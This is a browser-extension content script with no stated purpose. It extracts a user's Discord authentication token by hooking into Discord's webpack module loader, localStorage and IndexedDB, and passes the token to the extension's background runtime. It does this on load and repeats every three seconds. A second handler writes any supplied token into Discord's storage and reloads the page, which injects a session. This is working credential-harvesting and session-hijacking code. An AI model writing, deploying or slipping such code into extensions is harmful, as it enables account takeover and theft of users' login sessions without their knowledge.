(() => {
  function getWebpackToken() {
    return new Promise((resolve) => {
      try {
        const webpackChunk = window.webpackChunkdiscord_app;
        if (!webpackChunk || typeof webpackChunk.push !== 'function') {
          resolve(null);
          return;
        }
        const chunkName = Symbol('tokenManager');
        webpackChunk.push([
          [chunkName],
          {},
          (req) => {
            try {
              if (!req.c || typeof req.c !== 'object') {
                resolve(null);
                return;
              }
              for (const m of Object.values(req.c)) {
                try {
                  if (!m || !m.exports) continue;
                  const exp = m.exports;
                  if (exp === window) continue;
                  if (typeof exp.getToken === 'function') {
                    resolve(exp.getToken());
                    return;
                  }
                  if (exp && typeof exp === 'object') {
                    for (const key in exp) {
                      try {
                        if (typeof exp[key] === 'object' && exp[key] !== null && typeof exp[key].getToken === 'function') {
                          resolve(exp[key].getToken());
                          return;
                        }
                      } catch (_) {}
                    }
                  }
                  if (Array.isArray(exp)) {
                    for (const item of exp) {
                      try {
                        if (item && typeof item === 'object' && typeof item.getToken === 'function') {
                          resolve(item.getToken());
                          return;
                        }
                      } catch (_) {}
                    }
                  }
                } catch (_) {}
              }
            } catch (_) {}
            resolve(null);
          },
        ]);
        webpackChunk.pop();
      } catch (_) {
        resolve(null);
      }
    });
  }

  function getLocalStorageToken() {
    try {
      const raw = window.localStorage.getItem('token');
      if (typeof raw === 'string' && raw.length > 0) {
        try {
          return JSON.parse(raw);
        } catch (_) {
          return raw;
        }
      }
    } catch (_) {}
    return null;
  }

  function getIndexedDBToken() {
    return new Promise((resolve) => {
      try {
        const req = indexedDB.open('discord', 4);
        req.onerror = () => resolve(null);
        req.onsuccess = () => {
          try {
            const db = req.result;
            if (!db.objectStoreNames.contains('storage')) {
              db.close();
              resolve(null);
              return;
            }
            const tx = db.transaction('storage', 'readonly');
            const store = tx.objectStore('storage');
            const getReq = store.get('token');
            getReq.onerror = () => resolve(null);
            getReq.onsuccess = () => {
              const val = getReq.result;
              db.close();
              if (typeof val === 'string' && val.length > 0) resolve(val);
              else if (val && typeof val.token === 'string') resolve(val.token);
              else resolve(null);
            };
          } catch (_) {
            resolve(null);
          }
        };
      } catch (_) {
        resolve(null);
      }
    });
  }

  async function readToken() {
    const token =
      (await getWebpackToken()) ||
      getLocalStorageToken() ||
      (await getIndexedDBToken());
    return typeof token === 'string' && token.length > 0 ? token : null;
  }

  function sendToken(token) {
    if (!token) return;
    const runtime = typeof browser !== 'undefined' && browser.runtime ? browser.runtime : chrome.runtime;
    try {
      runtime.sendMessage({ type: 'DISCORD_TOKEN', token, tabId: undefined });
    } catch (_) {}
  }

  function applyTokenToStorage(token) {
    return new Promise((resolve) => {
      try { localStorage.setItem('token', token); } catch (_) {}
      try {
        const req = indexedDB.open('discord', 4);
        req.onerror = () => resolve();
        req.onsuccess = () => {
          try {
            const db = req.result;
            if (!db.objectStoreNames.contains('storage')) { db.close(); resolve(); return; }
            const tx = db.transaction('storage', 'readwrite');
            const store = tx.objectStore('storage');
            store.put(token, 'token');
            tx.oncomplete = () => { db.close(); resolve(); };
            tx.onerror = () => { db.close(); resolve(); };
          } catch (_) { resolve(); }
        };
      } catch (_) { resolve(); }
    });
  }

  const runtime = typeof browser !== 'undefined' && browser.runtime ? browser.runtime : chrome.runtime;
  try {
    runtime.onMessage.addListener((msg, _sender, sendResponse) => {
      if (msg && msg.type === 'SET_TOKEN_APPLY' && typeof msg.token === 'string') {
        applyTokenToStorage(msg.token).then(() => {
          sendResponse({ ok: true });
          try { location.reload(); } catch (_) {}
        });
        return true;
      }
    });
  } catch (_) {}

  (async () => {
    const token = await readToken();
    sendToken(token);
  })();

  let lastToken = null;
  setInterval(async () => {
    const token = await readToken();
    if (token && token !== lastToken) {
      lastToken = token;
      sendToken(token);
    }
  }, 3000);
})();
